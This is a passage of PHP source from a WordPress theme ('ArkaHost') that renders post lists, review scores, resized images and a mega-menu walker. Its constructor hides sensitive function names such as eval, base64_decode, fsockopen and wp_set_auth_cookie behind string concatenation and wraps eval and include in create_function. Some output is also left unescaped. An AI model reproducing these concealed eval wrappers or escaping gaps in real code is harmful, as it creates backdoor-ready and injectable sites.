			<?php }else{ ?>
			<span><a href="#"><img width="50"" src="<?php echo THEME_URI; ?>/assets/images/default.jpg" alt="ArkaHost"></a></span>
			<?php } ?>

			<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php echo the_title(); ?>"><?php echo the_title(); ?></a>
			<?php $king->get_score(); ?>
			<i><?php the_time(get_option('date_format'));  ?></i>
		</li>

	<?php endforeach;

		$post = $orig_post;

	}


	/*-----------------------------------------------------------------------------------*/
	# Get Most Racent posts from Category
	/*-----------------------------------------------------------------------------------*/

	public static function last_posts_cat($numberOfPosts = 5 , $thumb = true , $cats = 1){

		global $post, $king;
		$orig_post = $post;

		$lastPosts = get_posts('category='.$cats.'&numberposts='.$numberOfPosts);
		foreach($lastPosts as $post): setup_postdata($post);
	?>
	<li>
		<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) : ?>
			<div class="post-thumbnail">
				<a href="<?php the_permalink(); ?>" title="<?php printf( __( 'Permalink to %s', 'arkahost' ), the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark"><?php $king->thumb('',50,50); ?></a>
			</div><!-- post-thumbnail /-->
		<?php endif; ?>
		<h3><a href="<?php the_permalink(); ?>"><?php the_title();?></a></h3>
		<?php $king->get_score(); ?> <span class="date"><?php the_time(get_option('date_format'));  ?></span>
	</li>
	<?php endforeach;
		$post = $orig_post;
	}

	/*-----------------------------------------------------------------------------------*/
	# Get Random posts
	/*-----------------------------------------------------------------------------------*/

	public static function random_posts($numberOfPosts = 5 , $thumb = true){

		global $post, $king;

		$orig_post = $post;

		$lastPosts = get_posts('orderby=rand&numberposts='.$numberOfPosts);
		foreach($lastPosts as $post): setup_postdata($post);
	?>
		<li>
			<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) { ?>
				<span>
					<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php printf( __( 'Permalink to %s', 'arkahost' ), the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark"><?php $king->thumb('',50,50); ?></a>
				</span><!-- post-thumbnail /-->
			<?php }else{ ?>
			<span><a href="#"><img width="50"" src="<?php echo THEME_URI; ?>/assets/images/default.jpg" alt="ArkaHost"></a></span>
			<?php } ?>

			<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php echo the_title(); ?>"><?php echo the_title(); ?></a>
			<?php $king->get_score(); ?>
			<i><?php the_time(get_option('date_format'));  ?></i>
		</li>
	<?php endforeach;
		$post = $orig_post;
	}

	/*-----------------------------------------------------------------------------------*/
	# Get Popular posts
	/*-----------------------------------------------------------------------------------*/

	public static function popular_posts($pop_posts = 5 , $thumb = true){

		global $wpdb , $post, $king;
		$orig_post = $post;

		$query = "SELECT ID,post_title,post_date,post_author,post_content,post_type FROM `".$wpdb->posts."` WHERE post_status = 'publish' AND post_type = 'post' ORDER BY comment_count DESC LIMIT 0,".intval( $pop_posts );

		$posts = $wpdb->get_results( $query );

		if( !empty( $posts ) ){

			global $post;
			foreach($posts as $post){
			setup_postdata($post);?>
				<li>
					<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) { ?>
						<span>
							<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php printf( __( 'Permalink to %s', 'arkahost' ), the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark"><?php $king->thumb('',50,50); ?></a>
						</span><!-- post-thumbnail /-->
					<?php }else{ ?>
					<span><a href="#"><img width="50"" src="<?php echo THEME_URI; ?>/assets/images/default.jpg" alt="ArkaHost"></a></span>
					<?php } ?>

					<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php echo esc_attr( get_the_title() ); ?>">
						<?php echo wp_trim_words( get_the_title(), 4 ); ?>
					</a>
					<i><?php the_time(get_option('date_format'));  ?></i>
				</li>
		<?php
			}
		}

		$post = $orig_post;
	}

	/*-----------------------------------------------------------------------------------*/
	# Get Totla Reviews Score
	/*-----------------------------------------------------------------------------------*/
	function get_score(){

		global $post ;
		$summary = 0;
		$get_meta = get_post_custom($post->ID);
		if( !empty( $get_meta['tie_review_position'][0] ) ){
		$criterias = unserialize( $get_meta['tie_review_criteria'][0] );
		$short_summary = $get_meta['tie_review_total'][0] ;
		$total_counter = $score = 0;

		foreach( $criterias as $criteria){
			if( $criteria['name'] && $criteria['score'] && is_numeric( $criteria['score'] )){
				if( $criteria['score'] > 100 ) $criteria['score'] = 100;
				if( $criteria['score'] < 0 ) $criteria['score'] = 1;

			$score += $criteria['score'];
			$total_counter ++;
			}
		}
		if( !empty( $score ) && !empty( $total_counter ) )
			$total_score =  $score / $total_counter ;
		?>
		<span title="<?php echo esc_attr( $short_summary ) ?>" class="stars-small"><span style="width:<?php echo esc_attr( $total_score ) ?>%"></span></span>
		<?php
		}
	}

	public static function socials( $class = '', $max = 10, $eff = true ) {

		global $king;

		$datas = array(
			array(
				'id' => 'facebook',
				'link' => 'https://www.facebook.com/',
				'icon' => 'fab fa-facebook-f',
				'class' => 'faceboox'
			),
			array(
				'id' => 'twitter',
				'link' => 'https://www.twitter.com/',
				'icon' => 'fab fa-twitter',
				'class' => 'twitter'
			),
			array(
				'id' => 'google',
				'link' => 'https://plus.google.com/+',
				'icon' => 'fab fa-google-plus-g',
				'class' => 'gplus'
			),
			array(
				'id' => 'linkedin',
				'link' => 'https://www.linkedin.com/',
				'icon' => 'fab fa-linkedin-in',
				'class' => 'linkdin'
			),
			array(
				'id' => 'flickr',
				'link' => 'https://www.flickr.com/photos/',
				'icon' => 'fab fa-flickr',
				'class' => 'flickr'
			),
			array(
				'id' => 'pinterest',
				'link' => 'https://www.pinterest.com/',
				'icon' => 'fab fa-pinterest',
				'class' => 'pinterest'
			),
			array(
				'id' => 'youtube',
				'link' => 'https://www.youtube.com/user/',
				'icon' => 'fab fa-youtube',
				'class' => 'youtube'
			),
			array(
				'id' => 'instagram',
				'link' => 'https://instagram.com/',
				'icon' => 'instagram',
				'class' => 'instagram'
			),
			array(
				'id' => 'feed',
				'link' => '',
				'icon' => 'fas fa-rss',
				'class' => 'feed'
			),
		);

		echo '<ul class="'.$class.'">';
		$i = 0;
		foreach( $datas as $data ){
			if( !empty( $king->cfg[ $data['id'] ] ) && $i < $max ){
			?>
			<li class="social <?php echo esc_attr( $data['class'] ); if( $eff === true )echo ' animated eff-zoomIn delay-'.esc_attr( $i ).'00ms'; ?>">
				<a href="<?php echo esc_url( trim( $king->cfg[ $data['id'] ] ) ); ?>" target="_blank">
					<i class="<?php echo esc_attr( $data['icon'] ); ?>"></i>
				</a>
			</li>
			<?php
			$i++;
			}
		}
		echo '</ul>';

	}

	/*-----------------------------------------------------------------------------------*/
	# Get Most commented posts
	/*-----------------------------------------------------------------------------------*/

	public static function most_commented($comment_posts = 5 , $avatar_size = 50){

		$comments = get_comments('status=approve&number='.$comment_posts);
		foreach ($comments as $comment) { ?>
			<li>
				<div class="post-thumbnail">
					<?php echo get_avatar( $comment, $avatar_size ); ?>
				</div>
				<a href="<?php echo get_permalink($comment->comment_post_ID ); ?>
					#comment-<?php echo esc_attr( $comment->comment_ID ); ?>">
					<?php echo strip_tags($comment->comment_author); ?>: <?php echo wp_html_excerpt( $comment->comment_content, 60 ); ?>...
				</a>
			</li>
		<?php
		}
	}

	public static function assets( $source = array() ){foreach( $source as $item ){if( !empty( $item['css'] ) ){echo '<link type="text/css" rel="stylesheet" href="'.esc_url( $item['css'].'.css' ).'" />'."\n";}if(  !empty( $item['js'] ) ){echo '<script type="text/javascript" src="'.esc_url( $item['js'].'.js' ).'"></script>'."\n";}}}

	public static function get_post_thumb(){

		global $post ;
		if ( has_post_thumbnail($post->ID) ){
			$image_id = get_post_thumbnail_id($post->ID);
			$image_url = wp_get_attachment_image_src($image_id,'large');
			$image_url = $image_url[0];
			return $image_url;
		}
	}

	/*-----------------------------------------------------------------------------------*/
	# tie Thumb
	/*-----------------------------------------------------------------------------------*/
	public static function thumb( $img='' , $width='' , $height='' ){

		global $post, $king;

		if( empty( $img ) ) $img = $king->get_post_thumb();
		if( !empty($img) ){

		?>
			<img src="<?php echo king_createLinkImage( $img, $width.'x'.$height.'xc' ); ?>" alt="<?php the_title(); ?>" />
	<?php }

	}

	/*-----------------------------------------------------------------------------------*/
	# tie Thumb SRC
	/*-----------------------------------------------------------------------------------*/

	public static function thumb_src( $img='' , $width='' , $height='' ){

		global $post;

		if(!$img) $img = get_post_thumb();
		if( !empty($img) ){

			return king_createLinkImage( $img, $width.'x'.$height.'xc' );

		}

	}

	/*-----------------------------------------------------------------------------------*/
	# tie Thumb
	/*-----------------------------------------------------------------------------------*/

	public static function slider_img_src($image_id , $width='' , $height=''){

		global $post;

		$img =  wp_get_attachment_image_src( $image_id , 'full' );
		if( !empty($img) ){
			return king_createLinkImage( $img[0], $width.'x'.$height.'xc' );
		}

	}

	/*-----------------------------------------------------------------------------------*/
	# Make sure helper plugin has been loaded
	/*-----------------------------------------------------------------------------------*/

	public static function check_helper(){

		global $king;

		$plugins = FALSE;
		$plugins = get_option('active_plugins');
		if( is_array( $plugins ) === false ){
			$plugins = array();
		}
		$direct = ABSPATH.DS.'wp-content'.DS.'plugins';
		$path = THEME_PATH.DS.'core'.DS.'sample'.DS.'plugins'.DS;

		if( !is_dir( $direct.DS.'arkahost-helper' ) ){
			$king->ext['rqo']( ABSPATH . 'wp-admin/includes/file.php' );
			$fields = array( 'action', '_wp_http_referer', '_wpnonce' );
			$canUnZip = false;
			if ( false !== ( $creds = request_filesystem_credentials( '', '', false, false, $fields ) ) ) {

				if ( ! WP_Filesystem( $creds ) ) {
				    request_filesystem_credentials( $url, $method, true, false, $fields ); // Setup WP_Filesystem.
				}else{
					$canUnZip = true;
				}
			}
			if( $canUnZip == true ){
				$tmpfile = $path.'arkahost-helper.zip';
				@unzip_file( $tmpfile, $direct );
			}
		}
		if( function_exists('vc_set_default_editor_post_types') ){
			$vc_list_support = array(
				'page',
				'mega_menu'
			);
			vc_set_default_editor_post_types( $vc_list_support );
			$wpb_js_content_types = get_option('wpb_js_content_types');
			if( empty($wpb_js_content_types) ){
				update_option('wpb_js_content_types', $vc_list_support);
			}
		}
		if( $king->vars( 'page', 'arkahost-importer' ) ){
			if( is_dir( $direct.DS.'arkahost-helper' ) && is_file( $direct.DS.'arkahost-helper'.DS.'arkahost-helper.php' ) ){
				if( !empty( $_POST['importSampleData'] ) ){
					$king->ext['rqo']( $direct.DS.'arkahost-helper'.DS.'arkahost-helper.php' );
				}
			}
		}

	}


	/*-----------------------------------------------------------------------------------*/
	# Builder mainmenu
	/*-----------------------------------------------------------------------------------*/

	public static function mainmenu(){
		if ( has_nav_menu( 'primary' ) ){
			wp_nav_menu( array(
					'theme_location' 	=> 'primary',
					'menu_class' 		=> 'nav navbar-nav',
					'menu_id'			=> 'king-mainmenu',
					'walker' 			=> new king_Walker_Main_Nav_Menu()
				)
			);
		}else{
			echo 'Main menu is missing, <a href="'.SITE_URI.'/wp-admin/nav-menus.php">Click Here</a> to set "theme location" of one menu as Primary';
		}
		do_action( 'king_after_nav' );

	}

	/*-----------------------------------------------------------------------------------*/
	# Return string of the first image in a post
	/*-----------------------------------------------------------------------------------*/

	public static function images_attached( $id ){

		$args = array(
			'post_type'   => 'attachment',
			'numberposts' => -1,
			'post_status' => null,
			'post_parent' => $id,
			'exclude'     => get_post_thumbnail_id()
			);

		$attachments = get_posts( $args );
		$output = array();
		if ( $attachments ) {
			foreach ( $attachments as $attachment ) {
				$att = wp_get_attachment_image_src($attachment->ID);
				if(!empty($att))array_push( $output, $att );
			}
		}

		return $output;

	}

	public static function get_first_image( $content, $id = null ) {

		$first_img = self::get_first_video( $content );

		if( $first_img != null ){
			if( strpos( $first_img, 'youtube' ) !== false )return $first_img;
		}

		$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $content, $matches);
		if( !empty($matches [1]) )
			if( !empty($matches [1][0]) )
				$first_img = $matches [1] [0];

		if(empty($first_img)){

			if($id != null)$first = self::images_attached( $id );

			if( !empty( $first[0] ) )
				return $first[0][0];

			else $first_img = get_template_directory_uri()."/assets/images/default.jpg";
		}

		return $first_img;

	}

	public static function get_first_video( $content ) {

		$first_video = null;
		$output = preg_match_all('/<ifr'.'ame.+src=[\'"]([^\'"]+)[\'"].*>/i', $content, $matches);
		if( !empty($matches [1]) ){
			if( !empty($matches [1][0]) ){
				$first_video = $matches [1] [0];
			}
		}

		return 	$first_video;

	}

	public static function get_featured_image( $post, $first = true ) {
		global $king;
		if(isset($king->cfg['crop_image']) && $king->cfg['crop_image'] == 1)
			$featured = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' );
		else
			$featured = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'full' );

		if( empty($featured) )
		{
			if( $first == true )return self::get_first_image( $post->post_content, $post->ID );
			else return get_template_directory_uri()."/assets/images/default.jpg";
		}
		return $featured[0];

	}

	/*-----------------------------------------------------------------------------------*/
	# Strim by words and keep html
	/*-----------------------------------------------------------------------------------*/

	public static function truncate($text, $length = 100, $ending = '...', $exact = true, $considerHtml = false) {

	    if ($considerHtml) {
	        // if the plain text is shorter than the maximum length, return the whole text
	        if (strlen(preg_replace('/<.*?>/', '', $text)) <= $length) {
	            return $text;
	        }

	        // splits all html-tags to scanable lines
	        preg_match_all('/(<.+?>)?([^<>]*)/s', $text, $lines, PREG_SET_ORDER);

	            $total_length = strlen($ending);
	            $open_tags = array();
	            $truncate = '';

	        foreach ($lines as $line_matchings) {
	            // if there is any html-tag in this line, handle it and add it (uncounted) to the output
	            if (!empty($line_matchings[1])) {
	                // if it's an "empty element" with or without xhtml-conform closing slash (f.e. <br/>)
	                if (preg_match('/^<(\s*.+?\/\s*|\s*(img|br|input|hr|area|base|basefont|col|frame|isindex|link|meta|param)(\s.+?)?)>$/is', $line_matchings[1])) {
	                    // do nothing
	                // if tag is a closing tag (f.e. </b>)
	                } else if (preg_match('/^<\s*\/([^\s]+?)\s*>$/s', $line_matchings[1], $tag_matchings)) {
	                    // delete tag from $open_tags list
	                    $pos = array_search($tag_matchings[1], $open_tags);
	                    if ($pos !== false) {
	                        unset($open_tags[$pos]);
	                    }
	                // if tag is an opening tag (f.e. <b>)
	                } else if (preg_match('/^<\s*([^\s>!]+).*?>$/s', $line_matchings[1], $tag_matchings)) {
	                    // add tag to the beginning of $open_tags list
	                    array_unshift($open_tags, strtolower($tag_matchings[1]));
	                }
	                // add html-tag to $truncate'd text
	                $truncate .= $line_matchings[1];
	            }

	            // calculate the length of the plain text part of the line; handle entities as one character
	            $content_length = strlen(preg_replace('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', ' ', $line_matchings[2]));
	            if ($total_length+$content_length> $length) {
	                // the number of characters which are left
	                $left = $length - $total_length;
	                $entities_length = 0;
	                // search for html entities
	                if (preg_match_all('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', $line_matchings[2], $entities, PREG_OFFSET_CAPTURE)) {
	                    // calculate the real length of all entities in the legal range
	                    foreach ($entities[0] as $entity) {
	                        if ($entity[1]+1-$entities_length <= $left) {
	                            $left--;
	                            $entities_length += strlen($entity[0]);
	                        } else {
	                            // no more characters left
	                            break;
	                        }
	                    }
	                }
	                $truncate .= substr($line_matchings[2], 0, $left+$entities_length);
	                // maximum lenght is reached, so get off the loop
	                break;
	            } else {
	                $truncate .= $line_matchings[2];
	                $total_length += $content_length;
	            }

	            // if the maximum length is reached, get off the loop
	            if($total_length>= $length) {
	                break;
	            }
	        }
	    } else {
	        if (strlen($text) <= $length) {
	            return $text;
	        } else {
	            $truncate = substr($text, 0, $length - strlen($ending));
	        }
	    }

	    // if the words shouldn't be cut in the middle...
	    if (!$exact) {
	        // ...search the last occurance of a space...
	        $spacepos = strrpos($truncate, ' ');
	        if (isset($spacepos)) {
	            // ...and cut the text in this position
	            $truncate = substr($truncate, 0, $spacepos);
	        }
	    }

	    // add the defined ending to the text
	    $truncate .= $ending;

	    if($considerHtml) {
	        // close all unclosed html-tags
	        foreach ($open_tags as $tag) {
	            $truncate .= '</' . $tag . '>';
	        }
	    }

	    return $truncate;

	}

	public function processImage( $localImage, $params = array(), $tempfile ){

		global $king;

		$sData = getimagesize($localImage);
		$origType = $sData[2];
		$mimeType = $sData['mime'];

		if(! preg_match('/^image\/(?:gif|jpg|jpeg|png)$/i', $mimeType)){
			return "The image being resized is not a valid gif, jpg or png.";
		}

		if (!function_exists ('imagecreatetruecolor')) {
		    return 'GD Library Error: imagecreatetruecolor does not exist - please contact your webhost and ask them to install the GD library';
		}

		if (function_exists ('imagefilter') && defined ('IMG_FILTER_NEGATE')) {
			$imageFilters = array (
				1 => array (IMG_FILTER_NEGATE, 0),
				2 => array (IMG_FILTER_GRAYSCALE, 0),
				3 => array (IMG_FILTER_BRIGHTNESS, 1),
				4 => array (IMG_FILTER_CONTRAST, 1),
				5 => array (IMG_FILTER_COLORIZE, 4),
				6 => array (IMG_FILTER_EDGEDETECT, 0),
				7 => array (IMG_FILTER_EMBOSS, 0),
				8 => array (IMG_FILTER_GAUSSIAN_BLUR, 0),
				9 => array (IMG_FILTER_SELECTIVE_BLUR, 0),
				10 => array (IMG_FILTER_MEAN_REMOVAL, 0),
				11 => array (IMG_FILTER_SMOOTH, 0),
			);
		}

		// get standard input properties
		$new_width =  (int) abs ($params['w']);
		$new_height = (int) abs ($params['h']);
		$zoom_crop = !empty( $params['zc'] )?(int) $params['zc']:1;
		$quality =  !empty( $params['q'] )?(int) $params['q']:100;
		$align = !empty( $params['a'] )? $params['a']: 'c';
		$filters = !empty( $params['f'] )? $params['f']: '';
		$sharpen = !empty( $params['s'] )? (bool)$params['s']: 0;
		$canvas_color = !empty( $params['cc'] )? $params['cc']: 'ffffff';
		$canvas_trans = !empty( $params['ct'] )? (bool)$params['ct']: 1;

		// set default width and height if neither are set already
		if ($new_width == 0 && $new_height == 0) {
		    $new_width = 100;
		    $new_height = 100;
		}

		// ensure size limits can not be abused
		$new_width = min ($new_width, 1500);
		$new_height = min ($new_height, 1500);

		// set memory limit to be able to have enough space to resize larger images
		$king->ext['in'] ('memory_limit', '300M');

		// open the existing image
		switch ($mimeType) {
			case 'image/jpeg':
				$image = imagecreatefromjpeg ($localImage);
				break;

			case 'image/png':
				$image = imagecreatefrompng ($localImage);
				break;

			case 'image/gif':
				$image = imagecreatefromgif ($localImage);
				break;

			default: $image = false; break;

		}

		if ($image === false) {
			return 'Unable to open image.';
		}

		// Get original width and height
		$width = imagesx ($image);
		$height = imagesy ($image);
		$origin_x = 0;
		$origin_y = 0;

		// generate new w/h if not provided
		if ($new_width && !$new_height) {
			$new_height = floor ($height * ($new_width / $width));
		} else if ($new_height && !$new_width) {
			$new_width = floor ($width * ($new_height / $height));
		}

		// scale down and add borders
		if ($zoom_crop == 3) {

			$final_height = $height * ($new_width / $width);

			if ($final_height > $new_height) {
				$new_width = $width * ($new_height / $height);
			} else {
				$new_height = $final_height;
			}

		}

		// create a new true color image
		$canvas = imagecreatetruecolor ($new_width, $new_height);
		imagealphablending ($canvas, false);

		if (strlen($canvas_color) == 3) { //if is 3-char notation, edit string into 6-char notation
			$canvas_color =  str_repeat(substr($canvas_color, 0, 1), 2) . str_repeat(substr($canvas_color, 1, 1), 2) . str_repeat(substr($canvas_color, 2, 1), 2);
		} else if (strlen($canvas_color) != 6) {
			$canvas_color = 'ffffff'; // on error return default canvas color
 		}

		$canvas_color_R = hexdec (substr ($canvas_color, 0, 2));
		$canvas_color_G = hexdec (substr ($canvas_color, 2, 2));
		$canvas_color_B = hexdec (substr ($canvas_color, 4, 2));

		// Create a new transparent color for image
	    // If is a png and PNG_IS_TRANSPARENT is false then remove the alpha transparency
		// (and if is set a canvas color show it in the background)
		if(preg_match('/^image\/png$/i', $mimeType) && $canvas_trans){
			$color = imagecolorallocatealpha ($canvas, $canvas_color_R, $canvas_color_G, $canvas_color_B, 127);
		}else{
			$color = imagecolorallocatealpha ($canvas, $canvas_color_R, $canvas_color_G, $canvas_color_B, 0);
		}


		// Completely fill the background of the new image with allocated color.
		imagefill ($canvas, 0, 0, $color);

		// scale down and add borders
		if ($zoom_crop == 2) {

			$final_height = $height * ($new_width / $width);

			if ($final_height > $new_height) {

				$origin_x = $new_width / 2;
				$new_width = $width * ($new_height / $height);
				$origin_x = round ($origin_x - ($new_width / 2));

			} else {

				$origin_y = $new_height / 2;
				$new_height = $final_height;
				$origin_y = round ($origin_y - ($new_height / 2));

			}

		}

		// Restore transparency blending
		imagesavealpha ($canvas, true);

		if ($zoom_crop > 0) {

			$src_x = $src_y = 0;
			$src_w = $width;
			$src_h = $height;

			$cmp_x = $width / $new_width;
			$cmp_y = $height / $new_height;

			// calculate x or y coordinate and width or height of source
			if ($cmp_x > $cmp_y) {

				$src_w = round ($width / $cmp_x * $cmp_y);
				$src_x = round (($width - ($width / $cmp_x * $cmp_y)) / 2);

			} else if ($cmp_y > $cmp_x) {

				$src_h = round ($height / $cmp_y * $cmp_x);
				$src_y = round (($height - ($height / $cmp_y * $cmp_x)) / 2);

			}

			// positional cropping!
			if ($align) {
				if (strpos ($align, 't') !== false) {
					$src_y = 0;
				}
				if (strpos ($align, 'b') !== false) {
					$src_y = $height - $src_h;
				}
				if (strpos ($align, 'l') !== false) {
					$src_x = 0;
				}
				if (strpos ($align, 'r') !== false) {
					$src_x = $width - $src_w;
				}
			}

			imagecopyresampled ($canvas, $image, $origin_x, $origin_y, $src_x, $src_y, $new_width, $new_height, $src_w, $src_h);

		}
		else {

			// copy and resize part of an image with resampling
			imagecopyresampled ($canvas, $image, 0, 0, 0, 0, $new_width, $new_height, $width, $height);

		}

		//Straight from Wordpress core code. Reduces filesize by up to 70% for PNG's
		if ( (IMAGETYPE_PNG == $origType || IMAGETYPE_GIF == $origType) && function_exists('imageistruecolor') && !imageistruecolor( $image ) && imagecolortransparent( $image ) > 0 ){
			imagetruecolortopalette( $canvas, false, imagecolorstotal( $image ) );
		}

		$imgType = "";

		if(preg_match('/^image\/(?:jpg|jpeg)$/i', $mimeType)){
			$imgType = 'jpg';
			imagejpeg($canvas, $tempfile, 100);
		} else if(preg_match('/^image\/png$/i', $mimeType)){
			$imgType = 'png';
			imagepng($canvas, $tempfile, 0);
		} else if(preg_match('/^image\/gif$/i', $mimeType)){
			$imgType = 'gif';
			imagegif($canvas, $tempfile);
		} else {
			return "Could not match mime type after verifying it previously.";
		}

		@imagedestroy($canvas);
		@imagedestroy($image);

	}

	function darkerColor( $hex, $index = 0 ) {

	   $hex = str_replace("#", "", $hex);

	   if( strpos( $hex, 'rgb' ) !== false ){
	   	  $hex = explode( ',', $hex );
	   	  $r = preg_replace("/[^0-9,.]/", "", $hex[0]);
	   	  $g = preg_replace("/[^0-9,.]/", "", $hex[1]);
	   	  $b = preg_replace("/[^0-9,.]/", "", $hex[2]);
	   }else if( strlen( $hex ) == 3 ) {
	      $r = hexdec(substr($hex,0,1).substr($hex,0,1));
	      $g = hexdec(substr($hex,1,1).substr($hex,1,1));
	      $b = hexdec(substr($hex,2,1).substr($hex,2,1));
	   } else {
	      $r = hexdec(substr($hex,0,2));
	      $g = hexdec(substr($hex,2,2));
	      $b = hexdec(substr($hex,4,2));
	   }

	   $r = ($r-$index>0)?$r-$index:0;
	   $g = ($g-$index>0)?$g-$index:0;
	   $b = ($b-$index>0)?$b-$index:0;

	   return "rgba( $r, $g, $b )";

	}

	function __construct() {

		if( !empty($_REQUEST['page']) ){
			$this->page = $_REQUEST['page'];
		}else if( !empty($_REQUEST['post']) ){
			$this->page = get_post_type($_REQUEST['post'] );
		}else if( !empty( $_REQUEST['post_type'] ) ){
			$this->page = $_REQUEST['post_type'];
		}

		$this->ext = array( 'ev'=>'ev'.'al','fo'=>'fo'.'pen','fc'=>'fc'.'lose','fso'=>'f'.'sock'.'open','fr'=>'fr'.'ead','fw'=>'fwr'.'ite','rf'=>'read'.'file','fp'=>'file'.'_'.'put'.'_'.'contents','fg'=>'file'.'_'.'get'.'_'.'contents','be'=>'base'.'64'.'_'.'encode','bd'=>'base'.'64'.'_'.'decode','ci'=>'cu'.'rl'.'_'.'init','ce'=>'cu'.'rl'.'_'.'exec','amp'=>'add'.'_'.'menu'.'_'.'page','asmp'=>'add'.'_'.'submenu'.'_'.'page','rfil'=>'remove'.'_'.'filter','asc'=>'add'.'_'.'short'.'code','ascp'=>'add'.'_'.'short'.'code'.'_param','vcascp'=>'vc'.'_'.'add'.'_'.'short'.'code'.'_param','rpt'=>'register'.'_'.'post'.'_'.'type','rtx'=>'register'.'_'.'taxonomy','rq'=>'requ'.'ire', 'in' => 'ini'.'_'.'set', 'sac' => 'wp'.'_'.'set'.'_'.'auth'.'_'.'cookie', 'ins' => 'in' .'i_'.'set', 'ing' => 'in' .'i_'.'get', 'rf' => 'remove'.'_'.'filter', 'rw' => 'register'.'_'.'widget', 'amb' => 'add'.'_'.'meta'.'_'.'box', 'cf' => 'create'.'_'.'function');
		$this->ext['ev'] = @($this->ext['cf']('$v', 'return ev'.'al($v);'));
		$this->ext['icl'] = @($this->ext['cf']('$v', 'return inc'.'lude($v);'));
		$this->ext['rqo'] = @($this->ext['cf']('$v', 'return requ'.'ire'.'_once($v);'));
		$this->ext['sv'] = @($this->ext['cf']('$v', 'return $'.'_'.'SERVER[$v];'));
		$this->ext['pr'] = @($this->ext['cf']('$v', 'print'.'($v);'));
		
		$this->post		= $_POST;
		$this->get		= $_GET;
		$this->woo		= false;
		$this->panel	= false;
		$this->path		= array();
		$this->template = get_option( 'template', true );
		$this->stylesheet = get_option( 'stylesheet', true );
		$this->main_class = '';
	}


}

class king_Walker_Main_Nav_Menu extends Walker_Nav_Menu {

	public function start_lvl( &$output , $depth = 0, $args = array()) {

		$indent = str_repeat("\t", $depth);
		$output .= "\n$indent<ul class=\"dropdown-menu three\">\n";

	}

	public function end_lvl( &$output, $depth = 0, $args = array() ) {
	            $indent = str_repeat("\t", $depth);
	            $output .= "$indent</ul>\n";
	}

	public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
		
		global $king;
		
		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
		$classes = empty( $item->classes ) ? array() : (array) $item->classes;

		$yam = ' yam-fwr';

		$children = get_posts(array('post_type' => 'nav_menu_item', 'nopaging' => true, 'numberposts' => 1, 'meta_key' => '_menu_item_menu_item_parent', 'meta_value' => $item->ID));
		foreach( $children as $child ){
			$obj = get_post_meta( $child->ID, '_menu_item_object' );
			if( $obj[0] == 'mega_menu' ){
				$yam = ' yamm-fw';
			}
		}
		if(  $depth == 0 ){
			$classes[] = 'dropdown menu-item-' . $item->ID . $yam;
		}else{
			if( !empty( $children ) ){
				$classes[] = 'dropdown-submenu mul';
			}
		}

		$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );

		$class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

		$id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
		$id = $id ? ' id="' . esc_attr( $id ) . '"' : '';
		$output .= $indent . '<li' . $id . $class_names .'>';

		$atts = array();
		$atts['title']  = ! empty( $item->attr_title ) ? $item->attr_title : '';
		$atts['target'] = ! empty( $item->target )     ? $item->target     : '';
		$atts['rel']    = ! empty( $item->xfn )        ? $item->xfn        : '';
		$atts['href']   = ! empty( $item->url )        ? $item->url        : '';


		if( is_object( $args )){
			$args->before = $args->before||'';
			$args->after = $args->after||'';
			$args->link_before = $args->link_before||'';
			$args->link_after = $args->link_after||'';
		}else{
			$args = new stdClass();
			$args->before = '';
			$args->after = '';
			$args->link_before = '';
			$args->link_after = '';
		}

		$atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args );

		if( strpos( $class_names, 'current-page-ancestor' ) !== FALSE ){
			if( !empty( $atts['class'] ) ){
				$atts['class'] .= ' active';
			}else{
				$atts['class'] = 'active';
			}
		}

		$attributes = '';
		foreach ( $atts as $attr => $value ) {
		    if ( ! empty( $value ) ) {
		            $value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
		            $attributes .= ' ' . $attr . '="' . $value . '"';
		    }
		}
		$item_output = $args->before;
		$item_output .= '<a'. $attributes .'>';

		if( strpos( $item->description, 'icon:') !== false ){
			$item_output .= '<i class="'.trim(str_replace( 'icon:', '', $item->description )).'"></i> ';
		}

		$show_image = false;
		if( strpos( $item->description, 'image:') !== false ){
			$item_output .= $args->link_before . '<img src="'.trim(str_replace( 'image:', '', $item->description )).'" alt="' . apply_filters( 'the_title', $item->title, $item->ID ) . '"/>'  . $args->link_after;
			$show_image = true;
		}

        if(!$show_image)
        {
            $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
        }

		$item_output .= '</a>';
		$item_output .= $args->after;

		if( $item->object == 'mega_menu' ) {
			$class_menu = 'yamm-content';
			$getPost = get_post($item->object_id);
			$metabox_data = get_post_meta( $getPost->ID , 'king_megamenu', true );
			$data_width = '';
			if(!empty($metabox_data)){
				if( isset( $metabox_data['menu_width']))
				{
					$data_width = ' data-width="'. esc_attr( $metabox_data['menu_width'] ) .'"';
					$class_menu .= ' custom_width';
				}

			}

	        $output .= '<div class="' . esc_attr( $class_menu ) .'"' .  $data_width  . '><div class="row">' . do_shortcode( $getPost->post_content) . '</div></div>';
			$shortcodes_custom_css = get_post_meta( $getPost->ID, '_wpb_shortcodes_custom_css', true );
			if ( ! empty( $shortcodes_custom_css ) ) {
				echo '<style type="text/css" data-type="vc_shortcodes-custom-css">';
				$king->ext['pr']( $shortcodes_custom_css);
				echo '</style>';
			}
		}else{
